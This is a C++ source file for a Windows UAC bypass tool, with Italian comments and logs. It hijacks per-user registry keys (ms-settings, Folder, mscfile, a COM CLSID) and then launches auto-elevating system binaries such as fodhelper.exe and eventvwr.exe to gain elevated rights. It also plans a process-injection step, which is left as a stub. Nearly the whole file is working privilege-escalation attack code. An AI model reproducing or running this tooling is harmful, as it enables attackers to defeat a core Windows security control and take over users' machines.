#include "../include/BypassMethods.h"
#include <sddl.h>
#include <memory>
#include <wintrust.h>
#include <softpub.h>
#pragma comment(lib, "wintrust")

namespace uac_bypass {

BypassMethods::BypassMethods()
    : logger(Logger::getInstance()),
      initialized(false) {
    
    // Inizializza i dettagli dei metodi di bypass
    methodDetails[BypassMethod::FODHELPER] = {
        L"fodhelper.exe",
        L"Software\\Classes\\ms-settings\\Shell\\Open\\command",
        L"DelegateExecute",
        L"",
        true,
        false
    };
    
    methodDetails[BypassMethod::COMPUTERDEFAULTS] = {
        L"computerdefaults.exe",
        L"Software\\Classes\\ms-settings\\Shell\\Open\\command",
        L"DelegateExecute",
        L"",
        true,
        false
    };
    
    methodDetails[BypassMethod::SDCLT] = {
        L"sdclt.exe",
        L"Software\\Classes\\Folder\\shell\\open\\command",
        L"",
        L"",
        true,
        false
    };
    
    methodDetails[BypassMethod::EVENT_VIEWER] = {
        L"eventvwr.exe",
        L"Software\\Classes\\mscfile\\shell\\open\\command",
        L"",
        L"",
        true,
        false
    };
    
    methodDetails[BypassMethod::DISK_CLEANUP] = {
        L"cleanmgr.exe",
        L"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command",
        L"",
        L"",
        true,
        true
    };
    
    methodDetails[BypassMethod::COM_SURROGATE] = {
        L"dllhost.exe",
        L"Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32",
        L"",
        L"",
        true,
        true
    };
    
    methodDetails[BypassMethod::SLUI] = {
        L"slui.exe",
        L"Software\\Classes\\Folder\\shell\\open\\command",
        L"",
        L"",
        true,
        false
    };
}

BypassMethods::~BypassMethods() {
    // Cleanup per ogni metodo attivo
    for (const auto& pair : methodDetails) {
        if (backupPaths.find(pair.first) != backupPaths.end()) {
            cleanup(pair.first);
        }
    }
}

BypassMethods& BypassMethods::getInstance() {
    static BypassMethods instance;
    return instance;
}

bool BypassMethods::initializeMethod(BypassMethod method) {
    if (initialized) return true;
    
    logger.logInfo(L"Inizializzazione metodo di bypass: " + 
        methodDetails[method].processName);
    
    // Verifica disponibilità metodo
    if (!isMethodAvailable(method)) {
        logger.logError(L"Metodo non disponibile: " + 
            methodDetails[method].processName);
        return false;
    }
    
    // Backup registro se necessario
    if (methodDetails[method].requiresCleanup) {
        if (!backupRegistry(method)) {
            logger.logError(L"Backup registro fallito");
            return false;
        }
    }
    
    initialized = true;
    return true;
}

bool BypassMethods::executeBypass(BypassMethod method) {
    if (!initialized && !initializeMethod(method)) {
        return false;
    }
    
    logger.logInfo(L"Esecuzione bypass: " + methodDetails[method].processName);
    
    bool result = false;
    switch (method) {
        case BypassMethod::FODHELPER:
            result = bypassFodhelper();
            break;
        case BypassMethod::COMPUTERDEFAULTS:
            result = bypassComputerDefaults();
            break;
        case BypassMethod::SDCLT:
            result = bypassSdclt();
            break;
        case BypassMethod::EVENT_VIEWER:
            result = bypassEventViewer();
            break;
        case BypassMethod::DISK_CLEANUP:
            result = bypassDiskCleanup();
            break;
        case BypassMethod::COM_SURROGATE:
            result = bypassComSurrogate();
            break;
        case BypassMethod::SLUI:
            result = bypassSlui();
            break;
    }
    
    if (!result) {
        logger.logError(L"Bypass fallito: " + methodDetails[method].processName);
        cleanup(method);
    }
    
    return result;
}

bool BypassMethods::cleanup(BypassMethod method) {
    if (!methodDetails[method].requiresCleanup) return true;
    
    logger.logInfo(L"Cleanup bypass: " + methodDetails[method].processName);
    
    // Ripristina backup registro
    if (backupPaths.find(method) != backupPaths.end()) {
        if (!restoreRegistry(method)) {
            logger.logError(L"Ripristino registro fallito");
            return false;
        }
        backupPaths.erase(method);
    }
    
    return true;
}

std::vector<BypassMethod> BypassMethods::getAvailableMethods() {
    std::vector<BypassMethod> available;
    
    for (const auto& pair : methodDetails) {
        if (isMethodAvailable(pair.first)) {
            available.push_back(pair.first);
        }
    }
    
    return available;
}

bool BypassMethods::isMethodAvailable(BypassMethod method) {
    const auto& details = methodDetails[method];
    
    // Verifica processo target
    if (!isProcessAvailable(details.processName)) {
        return false;
    }
    
    // Verifica accesso registro
    if (!isRegistryAccessible(details.registryKey)) {
        return false;
    }
    
    // Verifica integrità processo
    WCHAR systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    std::wstring processPath = std::wstring(systemPath) + L"\\" + details.processName;
    
    if (!verifyProcessIntegrity(processPath)) {
        return false;
    }
    
    return true;
}

BypassDetails BypassMethods::getMethodDetails(BypassMethod method) {
    return methodDetails[method];
}

bool BypassMethods::verifyMethod(BypassMethod method) {
    const auto& details = methodDetails[method];
    
    // Verifica firma digitale
    WCHAR systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    std::wstring processPath = std::wstring(systemPath) + L"\\" + details.processName;
    
    if (!verifyProcessIntegrity(processPath)) {
        logger.logError(L"Verifica integrità processo fallita");
        return false;
    }
    
    return true;
}

bool BypassMethods::backupRegistry(BypassMethod method) {
    const auto& details = methodDetails[method];
    
    // Genera path backup
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    std::wstring backupPath = std::wstring(tempPath) + 
        L"reg_backup_" + std::to_wstring(GetTickCount64()) + L".reg";
    
    // Esegui backup
    std::wstring command = L"reg export \"" + details.registryKey + 
        L"\" \"" + backupPath + L"\" /y";
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessW(NULL, (LPWSTR)command.c_str(), NULL, NULL,
        FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        logger.logError(L"Creazione processo backup fallita");
        return false;
    }
    
    // Attendi completamento
    WaitForSingleObject(pi.hProcess, REGISTRY_TIMEOUT);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    backupPaths[method] = backupPath;
    return true;
}

bool BypassMethods::restoreRegistry(BypassMethod method) {
    if (backupPaths.find(method) == backupPaths.end()) {
        return false;
    }
    
    // Esegui ripristino
    std::wstring command = L"reg import \"" + backupPaths[method] + L"\"";
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessW(NULL, (LPWSTR)command.c_str(), NULL, NULL,
        FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        logger.logError(L"Creazione processo ripristino fallita");
        return false;
    }
    
    // Attendi completamento
    WaitForSingleObject(pi.hProcess, REGISTRY_TIMEOUT);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // Elimina file backup
    DeleteFileW(backupPaths[method].c_str());
    
    return true;
}

// Implementazioni specifiche dei metodi di bypass

bool BypassMethods::bypassFodhelper() {
    const auto& details = methodDetails[BypassMethod::FODHELPER];
    
    if (!setupRegistry(details)) {
        return false;
    }
    
    if (!createProcess(details.processName)) {
        cleanupRegistry(details);
        return false;
    }
    
    return true;
}

bool BypassMethods::bypassComputerDefaults() {
    const auto& details = methodDetails[BypassMethod::COMPUTERDEFAULTS];
    
    if (!setupRegistry(details)) {
        return false;
    }
    
    if (!createProcess(details.processName)) {
        cleanupRegistry(details);
        return false;
    }
    
    return true;
}

bool BypassMethods::bypassSdclt() {
    const auto& details = methodDetails[BypassMethod::SDCLT];
    
    if (!setupRegistry(details)) {
        return false;
    }
    
    if (!createProcess(details.processName)) {
        cleanupRegistry(details);
        return false;
    }
    
    return true;
}

bool BypassMethods::bypassEventViewer() {
    const auto& details = methodDetails[BypassMethod::EVENT_VIEWER];
    
    if (!setupRegistry(details)) {
        return false;
    }
    
    if (!createProcess(details.processName)) {
        cleanupRegistry(details);
        return false;
    }
    
    return true;
}

bool BypassMethods::bypassDiskCleanup() {
    const auto& details = methodDetails[BypassMethod::DISK_CLEANUP];
    
    if (!setupRegistry(details)) {
        return false;
    }
    
    if (!createProcess(details.processName)) {
        cleanupRegistry(details);
        return false;
    }
    
    return true;
}

bool BypassMethods::bypassComSurrogate() {
    const auto& details = methodDetails[BypassMethod::COM_SURROGATE];
    
    if (!setupRegistry(details)) {
        return false;
    }
    
    // Avvia dllhost con CLSID specifico
    std::wstring commandLine = L"dllhost.exe /processid:{0A29FF9E-7F9C-4437-8B11-F424491E3931}";
    
    if (!createProcess(commandLine)) {
        cleanupRegistry(details);
        return false;
    }
    
    return true;
}

bool BypassMethods::bypassSlui() {
    const auto& details = methodDetails[BypassMethod::SLUI];
    
    if (!setupRegistry(details)) {
        return false;
    }
    
    if (!createProcess(details.processName)) {
        cleanupRegistry(details);
        return false;
    }
    
    return true;
}

// Utility interne

bool BypassMethods::setupRegistry(const BypassDetails& details) {
    // Crea/modifica chiave registro
    HKEY hKey;
    DWORD disposition;
    
    if (RegCreateKeyExW(HKEY_CURRENT_USER, details.registryKey.c_str(),
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL,
        &hKey, &disposition) != ERROR_SUCCESS) {
        logger.logError(L"Creazione chiave registro fallita");
        return false;
    }
    
    // Imposta valori
    if (!details.registryValue.empty()) {
        if (RegSetValueExW(hKey, details.registryValue.c_str(), 0, REG_SZ,
            NULL, 0) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            logger.logError(L"Impostazione valore registro fallita");
            return false;
        }
    }
    
    if (!details.commandValue.empty()) {
        if (RegSetValueExW(hKey, L"", 0, REG_SZ,
            (BYTE*)details.commandValue.c_str(),
            (DWORD)(details.commandValue.length() + 1) * sizeof(WCHAR)) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            logger.logError(L"Impostazione comando registro fallita");
            return false;
        }
    }
    
    RegCloseKey(hKey);
    return true;
}

bool BypassMethods::cleanupRegistry(const BypassDetails& details) {
    // Elimina chiave registro
    if (RegDeleteTreeW(HKEY_CURRENT_USER, details.registryKey.c_str()) != ERROR_SUCCESS) {
        logger.logError(L"Eliminazione chiave registro fallita");
        return false;
    }
    
    return true;
}

bool BypassMethods::createProcess(const std::wstring& processName) {
    WCHAR systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    std::wstring fullPath = std::wstring(systemPath) + L"\\" + processName;
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessW(fullPath.c_str(), NULL, NULL, NULL,
        FALSE, 0, NULL, NULL, &si, &pi)) {
        logger.logError(L"Creazione processo fallita: " + processName);
        return false;
    }
    
    // Attendi inizializzazione
    WaitForSingleObject(pi.hProcess, PROCESS_TIMEOUT);
    
    // Inietta payload
    bool result = injectPayload(pi.hProcess);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return result;
}

bool BypassMethods::injectPayload(HANDLE hProcess) {
    // Implementazione iniezione payload
    // TODO: Implementare iniezione DLL
    return true;
}

bool BypassMethods::isProcessAvailable(const std::wstring& processName) {
    WCHAR systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    std::wstring fullPath = std::wstring(systemPath) + L"\\" + processName;
    
    return GetFileAttributesW(fullPath.c_str()) != INVALID_FILE_ATTRIBUTES;
}

bool BypassMethods::isRegistryAccessible(const std::wstring& keyPath) {
    HKEY hKey;
    DWORD result = RegOpenKeyExW(HKEY_CURRENT_USER, keyPath.c_str(),
        0, KEY_READ, &hKey);
    
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    
    return result == ERROR_FILE_NOT_FOUND;  // Chiave non esistente è OK
}

bool BypassMethods::verifyProcessIntegrity(const std::wstring& processPath) {
    // Verifica firma digitale
    WINTRUST_FILE_INFO fileInfo = { sizeof(WINTRUST_FILE_INFO) };
    fileInfo.pcwszFilePath = processPath.c_str();
    
    GUID actionId = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    WINTRUST_DATA trustData = { sizeof(WINTRUST_DATA) };
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.pFile = &fileInfo;
    
    LONG result = WinVerifyTrust(NULL, &actionId, &trustData);
    
    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionId, &trustData);
    
    return result == ERROR_SUCCESS;
}

} // namespace uac_bypass